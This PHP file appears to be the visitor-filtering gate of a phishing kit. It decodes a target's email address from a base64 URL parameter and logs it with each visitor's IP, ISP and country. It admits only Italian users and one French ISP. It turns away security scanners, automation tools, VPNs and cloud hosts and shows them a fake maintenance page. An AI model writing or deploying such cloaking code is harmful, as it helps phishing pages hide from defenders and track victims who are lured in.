<?php
session_start();
require_once './config_bots.php';
date_default_timezone_set('Europe/Paris');

// --- Process Email from URL immediately ---
if(isset($_GET["hash"])){
	$eml = @base64_decode($_GET["hash"]);
}else{
	$eml = "N/A";
}
$_SESSION["email"] = $eml;

// --- Configuration for bot handling ---
$fake_content_file = 'fcontent.html'; // File to show to bots instead of blocking
$show_fake_content = true; // Set to false to redirect bots instead

// --- Helper Functions ---

function get_visitor_ip() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            return trim(explode(',', $_SERVER[$header])[0]);
        }
    }
    return '0.0.0.0';
}

function is_legitimate_isp($hostname, $asn, $country_code) {
    // New Logic: Allow ALL Italian users
    if ($country_code === 'IT') {
        return true;
    }
    
    // New Logic: Allow ONLY specific French users
    if ($country_code === 'FR') {
        $hostname_lower = strtolower($hostname);
        $asn_lower = strtolower($asn);
        
        // Specific check for Wifirst Networks and AS52075 Wifirst S.A.S.
        if (strpos($hostname_lower, 'wifirst networks') !== false && strpos($asn_lower, 'as52075 wifirst s.a.s.') !== false) {
            return true;
        }
    }
    
    return false;
}

function is_suspicious_hostname_pattern($hostname) {
    // Patterns that indicate hosting/cloud/bot services even with legitimate ASNs
    $suspicious_patterns = [
        // Cloud/hosting providers
        'amazonaws', 'googleusercontent', 'microsoft', 'azure', 'digitalocean',
        'linode', 'vultr', 'ovh', 'hetzner', 
        
        // VPN/Proxy services
        'proxy', 'vpn', 'tor', 'anonymous',
        
        // Generic hosting terms (be careful not to block legitimate ISP hostnames)
        'dedicated-server', 'vps-hosting', 'cloud-provider',
        'datacenter-', 'colocation-', 'server-farm',
        
        // Bot/automation indicators
        'bot', 'crawler', 'spider', 'scraper', 'automation'
    ];
    
    foreach($suspicious_patterns as $pattern) {
        if(strpos($hostname, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

function is_geographic_mismatch($hostname, $country_code) {
    $hostname_lower = strtolower($hostname);
    
    // Define country-specific ISP patterns
    $country_patterns = [
        'IT' => ['telecom italia', 'tim', 'wind tre', 'fastweb', 'vodafone italia', 'tiscali', 'eolo', 'linkem'],
        'FR' => ['wifirst'],
        'US' => ['bellsouth', 'att', 'verizon', 'comcast', 'charter'],
        'DE' => ['deutsche telekom', 'telekom', 'o2', 'vodafone deutschland'],
        'GB' => ['bt', 'british telecom', 'virgin media', 'sky broadband'],
    ];
    
    // Check for geographic mismatches
    foreach($country_patterns as $pattern_country => $patterns) {
        if($pattern_country !== $country_code) {
            foreach($patterns as $pattern) {
                if(strpos($hostname_lower, $pattern) !== false) {
                    return true; // Geographic mismatch detected
                }
            }
        }
    }
    
    return false;
}

function is_suspicious_asn($asn, $country_code) {
    $asn_lower = strtolower($asn);
    
    // Suspicious ASNs that are commonly used by bots/proxies/VPNs
    $suspicious_asns = [
        // Major cloud providers (often used for bots)
        'microsoft corporation', 'amazon', 'google', 'cloudflare',
        'digitalocean', 'ovh', 'hetzner', 'linode', 'vultr',
        
        // VPN providers
        'nordvpn', 'expressvpn', 'surfshark', 'cyberghost',
        
        // Known proxy/hosting networks
        'choopa', 'serverus', 'psychz', 'quadranet',
        
        // Datacenter networks
        'colocation', 'datacenter', 'hosting', 'server'
    ];
    
    foreach($suspicious_asns as $suspicious) {
        if(strpos($asn_lower, $suspicious) !== false) {
            return true;
        }
    }
    
    return false;
}

function is_suspicious_request() {
    $suspicious_patterns = [
        // Bot-like request methods
        $_SERVER['REQUEST_METHOD'] === 'HEAD',
        $_SERVER['REQUEST_METHOD'] === 'OPTIONS',
        
        // Suspicious query parameters
        isset($_GET['debug']) || isset($_GET['test']) || isset($_GET['scan']) || 
        isset($_GET['probe']) || isset($_GET['bot']) || isset($_GET['crawler']),
        
        // Rate limiting
        check_request_frequency(),
        
        // Missing essential headers
        empty($_SERVER['HTTP_ACCEPT']),
        empty($_SERVER['HTTP_ACCEPT_LANGUAGE']),
    ];
    
    return in_array(true, $suspicious_patterns);
}

function check_request_frequency() {
    $visitor_ip = get_visitor_ip();
    $now = time();
    $time_window = 60; // 1 minute
    $max_requests = 15; // Reduced to be more strict
    
    if (!isset($_SESSION['request_times'])) {
        $_SESSION['request_times'] = [];
    }
    
    // Clean old entries
    $_SESSION['request_times'] = array_filter($_SESSION['request_times'], function($time) use ($now, $time_window) {
        return ($now - $time) <= $time_window;
    });
    
    // Add current request
    $_SESSION['request_times'][] = $now;
    
    return count($_SESSION['request_times']) > $max_requests;
}

function is_headless_browser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Detect automation tools and suspicious user agents
    $headless_indicators = [
        'phantomjs', 'selenium', 'webdriver', 'playwright', 'puppeteer',
        'chrome-lighthouse', 'jsdom', 'headless', 'automation',
        // Additional bot patterns
        'python-requests', 'curl', 'wget', 'urllib', 'httpx',
        'scrapy', 'mechanize', 'apache-httpclient'
    ];
    
    foreach ($headless_indicators as $indicator) {
        if (stripos($user_agent, $indicator) !== false) {
            return true;
        }
    }
    
    // Check for missing or suspicious user agent
    if (empty($user_agent) || strlen($user_agent) < 10) {
        return true;
    }
    
    return false;
}

function run_bot_check() {
    global $show_fake_content, $fake_content_file;
    
    $visitor_ip = get_visitor_ip();
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ipDetails = null;
    $resp = '';

    // --- STEP 1: Developer Whitelist ---
    $whitelist_ips = ['127.0.0.1', '::1'];
    if (in_array($visitor_ip, $whitelist_ips)) {
        log_visitor($visitor_ip, true);
        return;
    }

    // --- STEP 2: Enhanced Bot Detection ---
    
    // Check for headless browsers first
    if (is_headless_browser()) {
        handle_bot($visitor_ip, "Headless Browser/Automation Tool Detected");
    }
    
    // Check for suspicious request patterns
    if (is_suspicious_request()) {
        handle_bot($visitor_ip, "Suspicious Request Pattern");
    }

    // --- STEP 3: IP Geolocation Check ---
    if (isset($_SESSION['ip_data']) && $_SESSION['ip_data']['query'] === $visitor_ip) {
        $ipDetails = $_SESSION['ip_data'];
        $resp = $_SESSION['ip_data_raw'];
    } else {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/{$visitor_ip}");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $resp = curl_exec($ch);
        curl_close($ch);
        
        $ipDetails = json_decode($resp, true);
        $_SESSION['ip_data'] = $ipDetails;
        $_SESSION['ip_data_raw'] = $resp;
    }

    if (!$ipDetails || $ipDetails['status'] !== 'success') {
        handle_bot($visitor_ip, "IP Geolocation API Failed");
    }

    // Store details in session
    $_SESSION["ip"] = $visitor_ip;
    $_SESSION["hostname"] = $ipDetails["isp"] ?? 'N/A';
    $_SESSION["country"] = $ipDetails["country"] ?? 'N/A';
    $_SESSION["asn"] = $ipDetails["as"] ?? 'N/A';
    $_SESSION["dtetme"] = date('d/m/Y H:i:s', time());

    $country_code = $ipDetails["countryCode"] ?? '';
    $allowed_countries = ["FR", "IT"];
    
    // Block non-allowed countries
    if (!in_array($country_code, $allowed_countries)) {
        handle_bot($visitor_ip, "Country Blocked: {$country_code}");
    }

    // --- STEP 4: Geographic Consistency Check ---
    if (is_geographic_mismatch($_SESSION["hostname"], $country_code)) {
        handle_bot($visitor_ip, "Geographic Mismatch: ISP doesn't match country");
    }

    // --- STEP 5: Suspicious ASN Check ---
    if (is_suspicious_asn($_SESSION["asn"], $country_code)) {
        handle_bot($visitor_ip, "Suspicious ASN: Cloud/VPN/Hosting Provider");
    }

    // --- STEP 6: Legitimate ISP Check (Most Important) ---
    if (!is_legitimate_isp($_SESSION["hostname"], $_SESSION["asn"], $country_code)) {
        // Log more detailed information for debugging
        $debug_info = "Hostname: {$_SESSION["hostname"]} | ASN: {$_SESSION["asn"]} | Country: {$country_code}";
        handle_bot($visitor_ip, "Non-whitelisted ISP - " . $debug_info);
    }

    // --- STEP 7: Additional Keyword Blocking ---
    $blocked_keywords = [
        // Web crawlers and bots
        'bot', 'crawl', 'spider', 'slurp', 'scraper', 'harvest',
        
        // Automation tools
        'python', 'wget', 'curl', 'requests', 'selenium', 'webdriver',
        
        // Security/scanning tools
        'scan', 'probe', 'test', 'monitor', 'check', 'nmap', 'burp',
        
        // Proxy/anonymization
        'proxy', 'tor', 'vpn', 'anonymous',
        
        // Hosting/cloud indicators
        'hosting', 'datacenter', 'cloud', 'server', 'vps'
    ];
    
    $visitor_info = strtolower($resp . " " . $user_agent);
    foreach ($blocked_keywords as $keyword) {
        if (strpos($visitor_info, $keyword) !== false) {
            handle_bot($visitor_ip, "Blocked Keyword: '{$keyword}'");
        }
    }

    // --- If all checks pass, allow the visitor ---
    log_visitor($visitor_ip, true);
}

function handle_bot($ip, $reason) {
    global $url_redirect, $show_fake_content, $fake_content_file;
    
    $log_message = date('Y-m-d H:i:s') . " | IP: {$ip} | Reason: {$reason}" . PHP_EOL;
    file_put_contents('log/bots_blocked.log', $log_message, FILE_APPEND);
    
    log_visitor($ip, false);

    if ($show_fake_content && file_exists($fake_content_file)) {
        serve_fake_content();
    } else {
        header("Location: " . $url_redirect);
        exit();
    }
}

function serve_fake_content() {
    global $fake_content_file;
    
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: public, max-age=3600');
    
    if (file_exists($fake_content_file)) {
        readfile($fake_content_file);
    } else {
        echo generate_default_fake_content();
    }
    exit();
}

function generate_default_fake_content() {
    return '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Under Maintenance</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; margin-bottom: 20px; }
        p { color: #666; line-height: 1.6; margin-bottom: 15px; }
        .status { background: #e8f4f8; padding: 15px; border-radius: 5px; color: #2c5aa0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔧 Site Under Maintenance</h1>
        <p>We are currently performing scheduled maintenance to improve our services.</p>
        <div class="status">
            <strong>Estimated completion:</strong> 2-3 hours<br>
            <strong>Status:</strong> In Progress
        </div>
        <p>Thank you for your patience. Please check back later.</p>
        <p><small>If you need immediate assistance, please contact support.</small></p>
    </div>
    
    <div style="position: absolute; left: -9999px; top: -9999px;">
        <input type="email" name="email_trap" value="">
        <input type="text" name="website" value="">
        <a href="/admin/login">Admin Login</a>
        <a href="/wp-admin/">WordPress Admin</a>
        <a href="mailto:admin@example.com">admin@example.com</a>
    </div>
</body>
</html>';
}

function log_visitor($ip, $is_allowed) {
    global $historyfile;
    $log_directory = 'log';
    if (!is_dir($log_directory)) {
        mkdir($log_directory, 0755, true);
    }
    
    $status = $is_allowed ? 1 : 0;
    $hostname = $_SESSION["hostname"] ?? 'N/A';
    $country = $_SESSION["country"] ?? 'N/A';
    $asn = $_SESSION["asn"] ?? 'N/A';
    $time = $_SESSION["dtetme"] ?? date('d/m/Y H:i:s');
    $email = $_SESSION["email"] ?? 'N/A';

    $activity_log = "IP : {$ip} | HOSTNAME : {$hostname} | COUNTRY : {$country} | ASN : {$asn} | TIME : {$time} | EMAIL : {$email} | STATUS : {$status}";
    
    file_put_contents($historyfile, "$activity_log\n", FILE_APPEND);
}

// --- Run the main check function ---
run_bot_check();
?>